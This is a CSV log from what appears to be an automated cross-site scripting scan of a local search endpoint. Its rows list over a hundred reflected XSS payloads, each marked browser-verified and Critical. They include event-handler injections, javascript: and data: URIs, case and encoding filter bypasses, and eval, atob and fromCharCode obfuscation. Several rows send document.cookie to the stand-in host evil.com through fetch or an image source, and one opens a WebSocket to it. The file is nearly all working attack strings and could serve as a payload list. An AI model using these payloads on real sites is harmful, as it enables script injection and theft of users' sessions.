Payload_Start_Time,Payload_End_Time,Duration_Seconds,Target_URL,HTTP_Method,Parameter,Payload,Reflection_Type,Browser_Verified,XSS_Event_Type,Severity
2026-01-10 16:23:32.034,2026-01-10 16:23:32.042,0.008,http://localhost:3000/search,GET,q,<img src=x onselect=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.042,2026-01-10 16:23:32.045,0.003,http://localhost:3000/search,GET,q,<img src=x onselectionchange=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.045,2026-01-10 16:23:32.048,0.002,http://localhost:3000/search,GET,q,<img src=x onselectstart=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.048,2026-01-10 16:23:32.050,0.003,http://localhost:3000/search,GET,q,<img src=x onstart=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.050,2026-01-10 16:23:32.052,0.002,http://localhost:3000/search,GET,q,<img src=x onstop=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.052,2026-01-10 16:23:32.059,0.007,http://localhost:3000/search,GET,q,<img src=x onsubmit=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.060,2026-01-10 16:23:32.062,0.003,http://localhost:3000/search,GET,q,<img src=x onunload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.062,2026-01-10 16:23:32.066,0.003,http://localhost:3000/search,GET,q,javascript:alert(1),RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.066,2026-01-10 16:23:32.068,0.002,http://localhost:3000/search,GET,q,javascript:alert('XSS'),RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.068,2026-01-10 16:23:32.070,0.002,http://localhost:3000/search,GET,q,javascript:prompt(1),RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.070,2026-01-10 16:23:32.079,0.009,http://localhost:3000/search,GET,q,javascript:confirm(1),RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.079,2026-01-10 16:23:32.082,0.003,http://localhost:3000/search,GET,q,"data:text/html,<script>alert(1)</script>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.082,2026-01-10 16:23:32.085,0.002,http://localhost:3000/search,GET,q,"data:text/html,<img src=x onerror=alert(1)>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.085,2026-01-10 16:23:32.092,0.007,http://localhost:3000/search,GET,q,<q/oncut=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.092,2026-01-10 16:23:32.095,0.003,http://localhost:3000/search,GET,q,<q/onclick=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.095,2026-01-10 16:23:32.098,0.003,http://localhost:3000/search,GET,q,<q/ondrag=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.098,2026-01-10 16:23:32.101,0.003,http://localhost:3000/search,GET,q,<q/ondrop=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.101,2026-01-10 16:23:32.103,0.002,http://localhost:3000/search,GET,q,<q/onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.103,2026-01-10 16:23:32.111,0.009,http://localhost:3000/search,GET,q,<q/onfocus=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.111,2026-01-10 16:23:32.114,0.003,http://localhost:3000/search,GET,q,<q/oninput=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.114,2026-01-10 16:23:32.117,0.002,http://localhost:3000/search,GET,q,<q/onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.117,2026-01-10 16:23:32.123,0.007,http://localhost:3000/search,GET,q,<q/onmove=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.124,2026-01-10 16:23:32.126,0.003,http://localhost:3000/search,GET,q,<q/onpaste=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.126,2026-01-10 16:23:32.129,0.003,http://localhost:3000/search,GET,q,<q/onreset=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.129,2026-01-10 16:23:32.132,0.002,http://localhost:3000/search,GET,q,<q/onresize=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.132,2026-01-10 16:23:32.134,0.002,http://localhost:3000/search,GET,q,<q/onscroll=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.134,2026-01-10 16:23:32.140,0.006,http://localhost:3000/search,GET,q,<q/onselect=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.140,2026-01-10 16:23:32.143,0.003,http://localhost:3000/search,GET,q,<q/onstart=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.143,2026-01-10 16:23:32.146,0.003,http://localhost:3000/search,GET,q,<q/onstop=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.146,2026-01-10 16:23:32.149,0.002,http://localhost:3000/search,GET,q,<q/onsubmit=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.149,2026-01-10 16:23:32.155,0.007,http://localhost:3000/search,GET,q,<script>alert(1),RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.155,2026-01-10 16:23:32.158,0.003,http://localhost:3000/search,GET,q,<img src=x onerror=alert(1),RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.158,2026-01-10 16:23:32.162,0.004,http://localhost:3000/search,GET,q,<svg onload=alert(1),RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.162,2026-01-10 16:23:32.164,0.002,http://localhost:3000/search,GET,q,<body onload=alert(1),RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.164,2026-01-10 16:23:32.171,0.007,http://localhost:3000/search,GET,q,<script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.171,2026-01-10 16:23:32.174,0.003,http://localhost:3000/search,GET,q,alert(1),RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.174,2026-01-10 16:23:32.177,0.003,http://localhost:3000/search,GET,q,</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.177,2026-01-10 16:23:32.179,0.002,http://localhost:3000/search,GET,q,<img	src=x	onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.179,2026-01-10 16:23:32.182,0.002,http://localhost:3000/search,GET,q,<svg,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.182,2026-01-10 16:23:32.188,0.006,http://localhost:3000/search,GET,q,onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.188,2026-01-10 16:23:32.191,0.003,http://localhost:3000/search,GET,q,<ScRiPt>alert(1)</ScRiPt>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.191,2026-01-10 16:23:32.193,0.003,http://localhost:3000/search,GET,q,<sCrIpT>alert(1)</sCrIpT>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.193,2026-01-10 16:23:32.196,0.003,http://localhost:3000/search,GET,q,<SCRIPT>alert(1)</SCRIPT>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.196,2026-01-10 16:23:32.199,0.003,http://localhost:3000/search,GET,q,<IMG SRC=x ONERROR=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.199,2026-01-10 16:23:32.207,0.008,http://localhost:3000/search,GET,q,<ImG sRc=x OnErRoR=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.207,2026-01-10 16:23:32.211,0.004,http://localhost:3000/search,GET,q,<SVG ONLOAD=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.211,2026-01-10 16:23:32.214,0.003,http://localhost:3000/search,GET,q,<SvG oNlOaD=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.214,2026-01-10 16:23:32.220,0.007,http://localhost:3000/search,GET,q,< script >alert(1)< / script >,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.220,2026-01-10 16:23:32.226,0.005,http://localhost:3000/search,GET,q,< img src=x onerror=alert(1) >,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.226,2026-01-10 16:23:32.229,0.003,http://localhost:3000/search,GET,q,< svg onload=alert(1) >,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.229,2026-01-10 16:23:32.237,0.008,http://localhost:3000/search,GET,q,<scr<script>ipt>alert(1)</scr</script>ipt>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.237,2026-01-10 16:23:32.240,0.003,http://localhost:3000/search,GET,q,<<script>script>alert(1)<</script>/script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.240,2026-01-10 16:23:32.243,0.003,http://localhost:3000/search,GET,q,"<img src=""x""onerror=alert(1)>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.243,2026-01-10 16:23:32.245,0.003,http://localhost:3000/search,GET,q,<svg/onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.245,2026-01-10 16:23:32.248,0.002,http://localhost:3000/search,GET,q,<svg//onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.248,2026-01-10 16:23:32.254,0.006,http://localhost:3000/search,GET,q,%3Cscript%3Ealert(1)%3C/script%3E,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.254,2026-01-10 16:23:32.256,0.003,http://localhost:3000/search,GET,q,%3Cimg%20src=x%20onerror=alert(1)%3E,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.256,2026-01-10 16:23:32.259,0.003,http://localhost:3000/search,GET,q,%3Csvg%20onload=alert(1)%3E,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.259,2026-01-10 16:23:32.261,0.003,http://localhost:3000/search,GET,q,<script>alert`1`</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.261,2026-01-10 16:23:32.264,0.002,http://localhost:3000/search,GET,q,<img src=x onerror=alert`1`>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.264,2026-01-10 16:23:32.270,0.006,http://localhost:3000/search,GET,q,<svg onload=alert`1`>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.270,2026-01-10 16:23:32.273,0.003,http://localhost:3000/search,GET,q,<script>/**/alert(1)/**/</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.273,2026-01-10 16:23:32.275,0.002,http://localhost:3000/search,GET,q,<script><!---->alert(1)<!----></script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.275,2026-01-10 16:23:32.278,0.003,http://localhost:3000/search,GET,q,<img src=x onerror=/**/alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.278,2026-01-10 16:23:32.280,0.002,http://localhost:3000/search,GET,q,<script>eval('alert(1)')</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.280,2026-01-10 16:23:32.282,0.002,http://localhost:3000/search,GET,q,"<script>eval(""alert(1)"")</script>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.282,2026-01-10 16:23:32.288,0.006,http://localhost:3000/search,GET,q,<script>eval(atob('YWxlcnQoMSk='))</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.288,2026-01-10 16:23:32.291,0.003,http://localhost:3000/search,GET,q,<img src=x onerror=eval('alert(1)')>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.291,2026-01-10 16:23:32.294,0.003,http://localhost:3000/search,GET,q,<svg onload=eval('alert(1)')>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.294,2026-01-10 16:23:32.296,0.002,http://localhost:3000/search,GET,q,<script>Function('alert(1)')()</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.296,2026-01-10 16:23:32.298,0.002,http://localhost:3000/search,GET,q,<script>new Function('alert(1)')()</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.298,2026-01-10 16:23:32.304,0.006,http://localhost:3000/search,GET,q,<img src=x onerror=Function('alert(1)')()>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.304,2026-01-10 16:23:32.307,0.003,http://localhost:3000/search,GET,q,"<script>setTimeout('alert(1)',0)</script>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.307,2026-01-10 16:23:32.310,0.003,http://localhost:3000/search,GET,q,"<script>setTimeout(""alert(1)"",0)</script>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.310,2026-01-10 16:23:32.313,0.002,http://localhost:3000/search,GET,q,"<script>setInterval('alert(1)',0)</script>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.313,2026-01-10 16:23:32.315,0.002,http://localhost:3000/search,GET,q,"<img src=x onerror=setTimeout('alert(1)',0)>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.315,2026-01-10 16:23:32.321,0.006,http://localhost:3000/search,GET,q,<script>location='javascript:alert(1)'</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.321,2026-01-10 16:23:32.323,0.003,http://localhost:3000/search,GET,q,<script>location.href='javascript:alert(1)'</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.324,2026-01-10 16:23:32.326,0.003,http://localhost:3000/search,GET,q,"<script>location=String.fromCharCode(106,97,118,97,115,99,114,105,112,116,58,97,108,101,114,116,40,49,41)</script>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.326,2026-01-10 16:23:32.329,0.002,http://localhost:3000/search,GET,q,<script>\u0061lert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.329,2026-01-10 16:23:32.331,0.002,http://localhost:3000/search,GET,q,<script>\u0061\u006C\u0065\u0072\u0074(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.331,2026-01-10 16:23:32.339,0.008,http://localhost:3000/search,GET,q,<img src=x onerror=\u0061lert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.339,2026-01-10 16:23:32.341,0.002,http://localhost:3000/search,GET,q,<script>eval('\x61lert(1)')</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.341,2026-01-10 16:23:32.344,0.003,http://localhost:3000/search,GET,q,<script>eval('\x61\x6C\x65\x72\x74\x28\x31\x29')</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.344,2026-01-10 16:23:32.346,0.002,http://localhost:3000/search,GET,q,"<script>alert(String.fromCharCode(88,83,83))</script>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.346,2026-01-10 16:23:32.349,0.002,http://localhost:3000/search,GET,q,"<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.349,2026-01-10 16:23:32.355,0.006,http://localhost:3000/search,GET,q,<script>document.write('<img src=x onerror=alert(1)>')</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.355,2026-01-10 16:23:32.357,0.003,http://localhost:3000/search,GET,q,<script>document.write('<svg onload=alert(1)>')</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.357,2026-01-10 16:23:32.360,0.003,http://localhost:3000/search,GET,q,<script>document.body.innerHTML='<img src=x onerror=alert(1)>'</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.360,2026-01-10 16:23:32.363,0.002,http://localhost:3000/search,GET,q,<a href=javascript:alert(1)>X</a>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.363,2026-01-10 16:23:32.365,0.002,http://localhost:3000/search,GET,q,"<a href=""javascript:alert(1)"">X</a>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.365,2026-01-10 16:23:32.371,0.006,http://localhost:3000/search,GET,q,<a href='javascript:alert(1)'>X</a>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.371,2026-01-10 16:23:32.374,0.003,http://localhost:3000/search,GET,q,<a href=j&#x61vascript:alert(1)>X</a>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.374,2026-01-10 16:23:32.377,0.003,http://localhost:3000/search,GET,q,<a href=j&#97vascript:alert(1)>X</a>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.377,2026-01-10 16:23:32.379,0.002,http://localhost:3000/search,GET,q,<form><button formaction=javascript:alert(1)>X</button></form>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.379,2026-01-10 16:23:32.381,0.002,http://localhost:3000/search,GET,q,<form><input formaction=javascript:alert(1) type=submit value=X></form>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.381,2026-01-10 16:23:32.388,0.006,http://localhost:3000/search,GET,q,<form><input type=submit formaction=javascript:alert(1) value=X></form>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.388,2026-01-10 16:23:32.391,0.003,http://localhost:3000/search,GET,q,<base href=javascript:alert(1)//>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.391,2026-01-10 16:23:32.395,0.003,http://localhost:3000/search,GET,q,"<script>import('data:text/javascript,alert(1)')</script>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.395,2026-01-10 16:23:32.398,0.003,http://localhost:3000/search,GET,q,"<noscript><p title=""</noscript><img src=x onerror=alert(1)>"">",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.398,2026-01-10 16:23:32.406,0.009,http://localhost:3000/search,GET,q,<div id=x tabindex=1 onactivate=alert(1)></div>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.406,2026-01-10 16:23:32.411,0.005,http://localhost:3000/search,GET,q,<div contenteditable onblur=alert(1)>test</div>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.411,2026-01-10 16:23:32.415,0.004,http://localhost:3000/search,GET,q,<div draggable=true ondrag=alert(1)>test</div>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.415,2026-01-10 16:23:32.418,0.003,http://localhost:3000/search,GET,q,<svg><animate onbegin=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.419,2026-01-10 16:23:32.431,0.013,http://localhost:3000/search,GET,q,<svg><set onbegin=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.431,2026-01-10 16:23:32.437,0.006,http://localhost:3000/search,GET,q,<svg><animatemotion onbegin=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.437,2026-01-10 16:23:32.442,0.005,http://localhost:3000/search,GET,q,<svg><animatetransform onbegin=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.442,2026-01-10 16:23:32.449,0.007,http://localhost:3000/search,GET,q,<svg><discard onbegin=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.449,2026-01-10 16:23:32.464,0.014,http://localhost:3000/search,GET,q,<math><maction actiontype=toggle onclick=alert(1)>X</maction></math>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.464,2026-01-10 16:23:32.471,0.008,http://localhost:3000/search,GET,q,"<iframe srcdoc=""<img src=x onerror=alert(1)>""></iframe>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.471,2026-01-10 16:23:32.486,0.015,http://localhost:3000/search,GET,q,"<iframe srcdoc=""<script>alert(1)</script>""></iframe>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.486,2026-01-10 16:23:32.494,0.007,http://localhost:3000/search,GET,q,"<iframe srcdoc=""<svg onload=alert(1)>""></iframe>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.494,2026-01-10 16:23:32.500,0.006,http://localhost:3000/search,GET,q,<img name=alert src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.500,2026-01-10 16:23:32.511,0.011,http://localhost:3000/search,GET,q,<form name=alert><input type=submit onclick=alert(1)></form>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.511,2026-01-10 16:23:32.515,0.004,http://localhost:3000/search,GET,q,<script>alert(document.cookie)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.515,2026-01-10 16:23:32.518,0.004,http://localhost:3000/search,GET,q,<script>fetch('http://evil.com?c='+document.cookie)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.518,2026-01-10 16:23:32.522,0.003,http://localhost:3000/search,GET,q,<img src=x onerror=this.src='http://evil.com?c='+document.cookie>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.522,2026-01-10 16:23:32.538,0.016,http://localhost:3000/search,GET,q,<svg onload=fetch('http://evil.com?c='+document.cookie)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.538,2026-01-10 16:23:32.543,0.005,http://localhost:3000/search,GET,q,<script>document.body.innerHTML+=alert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.543,2026-01-10 16:23:32.554,0.011,http://localhost:3000/search,GET,q,<script>document.getElementById('x').innerHTML='<img src=x onerror=alert(1)>'</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.554,2026-01-10 16:23:32.557,0.003,http://localhost:3000/search,GET,q,<body/onhashchange=alert(1)><a href=#x>clickme</a>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.557,2026-01-10 16:23:32.560,0.002,http://localhost:3000/search,GET,q,<body/onpopstate=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.560,2026-01-10 16:23:32.564,0.004,http://localhost:3000/search,GET,q,<body/onpageshow=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.564,2026-01-10 16:23:32.573,0.009,http://localhost:3000/search,GET,q,<body/onpagehide=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.573,2026-01-10 16:23:32.577,0.004,http://localhost:3000/search,GET,q,<body/onstorage=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.577,2026-01-10 16:23:32.581,0.004,http://localhost:3000/search,GET,q,<script>new WebSocket('ws://evil.com').onopen=alert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.581,2026-01-10 16:23:32.584,0.003,http://localhost:3000/search,GET,q,<script><![CDATA[alert(1)]]></script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.584,2026-01-10 16:23:32.591,0.007,http://localhost:3000/search,GET,q,"<?xml version=""1.0""?><script>alert(1)</script>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.591,2026-01-10 16:23:32.595,0.004,http://localhost:3000/search,GET,q,"<?xml-stylesheet type=""text/xsl"" href=""javascript:alert(1)""?>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.595,2026-01-10 16:23:32.599,0.004,http://localhost:3000/search,GET,q,﻿<script>alert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.599,2026-01-10 16:23:32.602,0.003,http://localhost:3000/search,GET,q,<source src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.602,2026-01-10 16:23:32.610,0.007,http://localhost:3000/search,GET,q,<track src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.610,2026-01-10 16:23:32.613,0.003,http://localhost:3000/search,GET,q,<image src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.613,2026-01-10 16:23:32.617,0.004,http://localhost:3000/search,GET,q,<use href=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.617,2026-01-10 16:23:32.621,0.004,http://localhost:3000/search,GET,q,<input autofocus onfocus=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.621,2026-01-10 16:23:32.628,0.007,http://localhost:3000/search,GET,q,<textarea autofocus onfocus=alert(1)></textarea>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.628,2026-01-10 16:23:32.632,0.004,http://localhost:3000/search,GET,q,<select autofocus onfocus=alert(1)></select>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.632,2026-01-10 16:23:32.635,0.003,http://localhost:3000/search,GET,q,<button autofocus onfocus=alert(1)>X</button>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.635,2026-01-10 16:23:32.638,0.003,http://localhost:3000/search,GET,q,<div onpointerdown=alert(1)>X</div>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.638,2026-01-10 16:23:32.641,0.003,http://localhost:3000/search,GET,q,<div onpointerup=alert(1)>X</div>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.641,2026-01-10 16:23:32.650,0.009,http://localhost:3000/search,GET,q,<div onpointerover=alert(1)>X</div>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.650,2026-01-10 16:23:32.653,0.003,http://localhost:3000/search,GET,q,<div onpointerenter=alert(1)>X</div>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.653,2026-01-10 16:23:32.656,0.003,http://localhost:3000/search,GET,q,<div onpointerleave=alert(1)>X</div>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.656,2026-01-10 16:23:32.664,0.008,http://localhost:3000/search,GET,q,<div onpointermove=alert(1)>X</div>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.664,2026-01-10 16:23:32.669,0.005,http://localhost:3000/search,GET,q,<div ontouchstart=alert(1)>X</div>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.669,2026-01-10 16:23:32.672,0.003,http://localhost:3000/search,GET,q,<div ontouchend=alert(1)>X</div>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.672,2026-01-10 16:23:32.680,0.008,http://localhost:3000/search,GET,q,<div ontouchmove=alert(1)>X</div>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.680,2026-01-10 16:23:32.685,0.005,http://localhost:3000/search,GET,q,"<div style=""animation:spin 1s"" onanimationstart=alert(1)>X</div>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.685,2026-01-10 16:23:32.688,0.003,http://localhost:3000/search,GET,q,"<div style=""animation:spin 1s"" onanimationend=alert(1)>X</div>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.688,2026-01-10 16:23:32.691,0.003,http://localhost:3000/search,GET,q,"<div style=""animation:spin 1s"" onanimationiteration=alert(1)>X</div>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:32.691,2026-01-10 16:23:32.701,0.010,http://localhost:3000/search,GET,q,"<div style=""transition:all 1s"" ontransitionend=alert(1)>X</div>",RAW_REFLECTION,Yes,alert,Critical
